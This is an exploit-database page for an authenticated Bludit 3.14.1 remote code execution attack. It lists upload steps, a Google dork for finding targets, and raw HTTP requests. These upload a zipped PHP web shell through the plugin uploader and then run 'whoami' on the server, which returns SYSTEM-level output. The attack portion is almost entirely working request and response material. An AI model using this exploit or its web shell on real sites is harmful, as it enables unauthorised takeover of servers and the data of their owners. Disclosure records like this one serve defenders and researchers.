---
title: Bludit 3-14-1 Shell Upload
url: https://cxsecurity.com/issue/WLB-2023040007
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-04-03
fetch_date: 2025-10-04T11:29:11.543847
---

# Bludit 3-14-1 Shell Upload

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Bludit 3-14-1 Shell Upload** **2023.04.02**  Credit:  **[Alperen Ergel](https://cxsecurity.com/author/Alperen%2BErgel/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-264](https://cxsecurity.com/cwe/CWE-264 "Click to see CWE-264")**  **[**Dork:** intext:'2022 Powered by Bludit'](https://cxsecurity.com/dorks/)** | |

# Exploit Title: Bludit 3-14-1 Plugin 'UploadPlugin' - Remote Code Execution (RCE) (Authenticated)
# Exploit Author: Alperen Ergel
# Contact: @alpernae (IG/TW)
# Software Homepage: https://www.bludit.com/
# Version : 3-14-1
# Tested on: windows 11 wampserver | Kali linux
# Category: WebApp
# Google Dork: intext:'2022 Powered by Bludit'
# Date: 8.12.2022
######## Description ########
#
# Step 1 : Archive as a zip your webshell (example: payload.zip)
# Step 2 : Login admin account and download 'UploadPlugin'
# Step 3 : Go to UploadPlugin section
# Step 4 : Upload your zip
# Step 5 : target/bl-plugins/[your\_payload]
#
######## Proof of Concept ########
==============> START REQUEST <========================================
POST /admin/plugin/uploadplugin HTTP/2
Host: localhost
Cookie: BLUDIT-KEY=ri91q86hhp7mia1o8lrth63kc4
User-Agent: Mozilla/5.0 (X11; Linux x86\_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,\*/\*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------308003478615795926433430552264
Content-Length: 1820
Origin: https://036e-88-235-222-210.eu.ngrok.io
Dnt: 1
Referer: https://036e-88-235-222-210.eu.ngrok.io/admin/plugin/uploadplugin
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
-----------------------------308003478615795926433430552264
Content-Disposition: form-data; name="tokenCSRF"
b6487f985b68f2ac2c2d79b4428dda44696d6231
-----------------------------308003478615795926433430552264
Content-Disposition: form-data; name="pluginorthemes"
plugins
-----------------------------308003478615795926433430552264
Content-Disposition: form-data; name="zip\_file"; filename="a.zip"
Content-Type: application/zip
PK eU  a/PK  fUÆ ª)¢ Ä
a/a.phpíVÛÓ0}ç+La BÛìVÜpX®ËJ @Vêº­!µíÒrûwl7É$mQyà<$©çÌÌ93ã¸È]Ë·ïóÒ=/.&nbsp;pÝãZ+M5/¶BÎÈ0>©M[jÅÓB,õtOÌ¤Ò.
×4;e)¨¼È×¯9[Z¡dðÆ &amp;Âd<ó`÷+Ny¼Á
RLÉE¾(í7â}âø\_¥æ3OºÈ'xð>A¯ppânÁã¤ëÀ×e¡&amp;ük£¼$Øj±ØFýâá@\@ªgxD¢Ì'áôæQ?½v£öG7ñùZgéññõ
j±u
\õ±à/ï¾ÎÞ´×THÄZujHkªÈ£û§gÑÅ,CÆêRâVjÅ5yùø%}q»ú­Ä(QK\*Ë"Öï¡£;Ò²·­6z²ZgXÊò¢ðíÄ'éûù+ñÌ%
µj,ÐäàN°ùf,\_à8[³lOScsmI«¬«H»¯\*Sc?i)i¹´&amp;x@.'<¤Ûç]zs^a®·)hBz0;f rìþÇ¸0yÕU¥H"ÕÕÿI IØ\t{có~J©£ªä²Ë Ö÷;dÁ³âÙlh»s%Ç Ö8Nº+«}+­ÿaºrÂÂj.
îvWS²A¿O?nHO?jO ¤Ã£Q+ì¯æí^ Ï
e8©ô\*Ô¾"ý¡@Ó2+ëÂ`÷
kC57j©'Î"m
ã®ho¹ xô Û;cçzÙQ
Ë·[kô¿Ý¯-2ì~¨æv©¥CîTþ#k2,UØS¦­OÁS£ØgúK QÜ ØIÏ²òÖ`Ð:%F½$A"t;buOMr4Ýè~eãÎåØXíÇmÇ(s 6A¸3,l>º<N®¦q{s \_\_~tÂ6á¾,ÅèçO´ÇÆ×Î£v²±ãÿbÃÚUg[;pqeÓÜÅØÿéJ
Ë}êv3ð8´# OµsÈO«ýbh±ï°dË¹ÿ>yþðMröâÁSzöæõÃûÏÜû)}óàeºqQRrf}êê\_D Ø0ìuõv'§öø?@ êûOæh'O8fD¼5[à²=b~PK? eU  $ íA a/
  þ®,
Ù þ®,
Ùø¨j.
ÙPK?  fUÆ ª)¢ Ä
$ ¤ a/a.php
  ¤eÝ-
Ù ÷C-
Ù bj.
ÙPK   ­ ç
-----------------------------308003478615795926433430552264
Content-Disposition: form-data; name="submit"
Upload
-----------------------------308003478615795926433430552264--
==============> END REQUEST <========================================
## WEB SHELL UPLOADED!
==============> START RESPONSE <========================================
HTTP/2 200 OK
Cache-Control: no-store, no-cache, must-revalidate
Content-Type: text/html; charset=UTF-8
Date: Thu, 08 Dec 2022 18:01:43 GMT
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Ngrok-Trace-Id: f3a92cc45b7ab0ae86e98157bb026ab4
Pragma: no-cache
Server: Apache/2.4.51 (Win64) PHP/7.4.26
X-Powered-By: Bludit
.
.
.
.
==============> END RESPONSE <========================================
# REQUEST THE WEB SHELL
==============> START REQUEST <========================================
GET /bl-plugins/a/a.php?cmd=whoami HTTP/2
Host: localhost
Cookie: BLUDIT-KEY=ri91q86hhp7mia1o8lrth63kc4
User-Agent: Mozilla/5.0 (X11; Linux x86\_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,\*/\*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Dnt: 1
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
==============> END REQUEST <========================================
==============> START RESPONSE <========================================
HTTP/2 200 OK
Content-Type: text/html; charset=UTF-8
Date: Thu, 08 Dec 2022 18:13:14 GMT
Ngrok-Trace-Id: 30639fc66dcf46ebe29cc45cf1bf3919
Server: Apache/2.4.51 (Win64) PHP/7.4.26
X-Powered-By: PHP/7.4.26
Content-Length: 32
<pre>nt authority\system
</pre>
==============> END RESPONSE <========================================

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023040007)

[Tweet](https://twitter.com/share)

Vote for this issue:
 1
 0

100%

0%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top